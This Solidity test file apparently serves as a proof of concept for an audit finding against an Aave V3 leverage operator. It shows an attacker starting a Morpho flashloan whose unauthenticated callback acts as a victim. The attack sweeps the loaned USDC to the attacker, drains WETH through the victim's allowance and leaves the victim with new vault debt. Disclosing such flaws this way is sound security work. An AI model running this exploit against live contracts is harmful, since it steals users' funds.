// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {AaveTestBase, console2} from "./AaveTestBase.t.sol";
import {MockSwapper} from "test/mocks/MockSwapper.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";

interface IMorpho {
    function flashLoan(address token, uint assets, bytes calldata data) external;
}

contract PoC_AaveV3LeverageOperator is AaveTestBase {

    address attacker;

    function setUp() public override {
        super.setUp();
        attacker = makeAddr("attacker_eve");
    }

    function test_PoC_Finding1_DrainViaUnauthenticatedMorphoCallback() public noGasMetering {
        // ------------------------------------------------------------------
        // 0. Install the mock swapper (same pattern as the existing tests).
        // ------------------------------------------------------------------
        MockSwapper mockSwapper = new MockSwapper();
        vm.etch(eulerSwapper, address(mockSwapper).code);

        // ------------------------------------------------------------------
        // 1. LEGITIMATE SETUP: Alice creates a vault and uses executeLeverage
        //    exactly the way a real user would. This establishes the two
        //    pre-requisites an attacker exploits:
        //      (a) Alice grants an ERC20/Permit2-style allowance on WETH to
        //          the operator (needed by executeLeverage),
        //      (b) Alice authorizes the operator on the EVC.
        // ------------------------------------------------------------------
        aave_createCollateralVault(address(aWETHWrapper), 9100);

        vm.startPrank(alice);

        uint userUnderlyingCollateralAmount = 1 ether;
        uint flashloanAmount = 1000e6;
        uint minAmountOutWETH = 0.9 ether;
        uint deadline = block.timestamp + 1000;

        deal(WETH, alice, userUnderlyingCollateralAmount * 4);
        IERC20(WETH).approve(address(alice_aave_vault), type(uint256).max);
        IERC20(WETH).approve(address(aaveV3LeverageOperator), type(uint256).max);

        alice_aave_vault.depositUnderlying(userUnderlyingCollateralAmount);

        deal(WETH, eulerSwapper, minAmountOutWETH + 1 ether);

        bytes memory legitSwap = abi.encodeCall(
            MockSwapper.swap,
            (USDC, WETH, flashloanAmount, minAmountOutWETH, address(aaveV3LeverageOperator))
        );
        bytes[] memory legitMulticall = new bytes[](1);
        legitMulticall[0] = legitSwap;

        evc.setAccountOperator(alice, address(aaveV3LeverageOperator), true);

        aaveV3LeverageOperator.executeLeverage(
            address(alice_aave_vault),
            userUnderlyingCollateralAmount,
            0,
            flashloanAmount,
            minAmountOutWETH,
            deadline,
            legitMulticall
        );

        vm.stopPrank();

        // ------------------------------------------------------------------
        // 2. SNAPSHOT pre-attack balances.
        // ------------------------------------------------------------------
        uint aliceWethBefore = IERC20(WETH).balanceOf(alice);
        uint aliceDebtBefore = alice_aave_vault.maxRepay();
        uint attackerUsdcBefore = IERC20(USDC).balanceOf(attacker);

        console2.log("---- BEFORE ATTACK ----");
        console2.log("Alice WETH wallet balance: ", aliceWethBefore);
        console2.log("Alice vault debt (USDC):   ", aliceDebtBefore);
        console2.log("Attacker USDC balance:     ", attackerUsdcBefore);

        // ------------------------------------------------------------------
        // 3. ATTACK: Eve crafts a Morpho flashloan whose callback data names
        //    Alice as `user` and the alice_aave_vault as `collateralVault`.
        //    The swapData simply sweeps the flashloaned USDC out of the
        //    swapper into Eve's wallet.
        // ------------------------------------------------------------------
        uint stolenWeth = 0.1 ether;          // pulled from Alice's WETH allowance
        uint attackerFlashloan = 500e6;        // USDC amount Eve will walk away with

        // Top up swapper with USDC liquidity for the swap path; in production
        // the swapper temporarily holds the flashloaned USDC during the call.
        bytes memory sweepCall = abi.encodeCall(MockSwapper.sweep, (USDC, 0, attacker));
        bytes[] memory maliciousMulticall = new bytes[](1);
        maliciousMulticall[0] = sweepCall;

        bytes memory maliciousData = abi.encode(
            alice,                       // user            <-- victim
            USDC,                        // targetAsset
            address(alice_aave_vault),   // collateralVault <-- victim's vault
            stolenWeth,                  // underlyingCollateralAmount (drained via approval)
            uint(0),                     // aTokenCollateralAmount
            uint(0),                     // minAmountOut    <-- slippage bypassed
            block.timestamp + 1000,      // deadline
            maliciousMulticall           // swapData: sweep USDC to attacker
        );

        // Eve initiates the Morpho flashloan. Morpho will:
        //   (a) transfer attackerFlashloan USDC to the operator,
        //   (b) invoke operator.onMorphoFlashLoan(amount, data),
        //   (c) pull repayment from the operator at the end.
        // The operator's callback satisfies the ONLY access check
        // (`msg.sender == MORPHO`) and proceeds to act as Alice.
        vm.prank(attacker);
        IMorpho(morpho).flashLoan(USDC, attackerFlashloan, maliciousData);

        // ------------------------------------------------------------------
        // 4. ASSERT impact: Eve profited, Alice lost.
        // ------------------------------------------------------------------
        uint aliceWethAfter = IERC20(WETH).balanceOf(alice);
        uint aliceDebtAfter = alice_aave_vault.maxRepay();
        uint attackerUsdcAfter = IERC20(USDC).balanceOf(attacker);

        console2.log("---- AFTER  ATTACK ----");
        console2.log("Alice WETH wallet balance: ", aliceWethAfter);
        console2.log("Alice vault debt (USDC):   ", aliceDebtAfter);
        console2.log("Attacker USDC balance:     ", attackerUsdcAfter);

        // Eve received the full flashloan amount (no signature, no approval,
        // no prior interaction with Alice required).
        assertEq(
            attackerUsdcAfter - attackerUsdcBefore,
            attackerFlashloan,
            "PoC: attacker did not receive the swept USDC"
        );

        // Alice's wallet was drained of `stolenWeth` via her standing allowance.
        assertEq(
            aliceWethBefore - aliceWethAfter,
            stolenWeth,
            "PoC: alice's WETH approval was not drained as expected"
        );

        // Alice's collateral vault now carries new USDC debt equal to the
        // flashloan amount the attacker walked away with.
        assertApproxEqAbs(
            aliceDebtAfter - aliceDebtBefore,
            attackerFlashloan,
            1,
            "PoC: alice's vault should have new debt equal to the attacker's take"
        );
    }
}
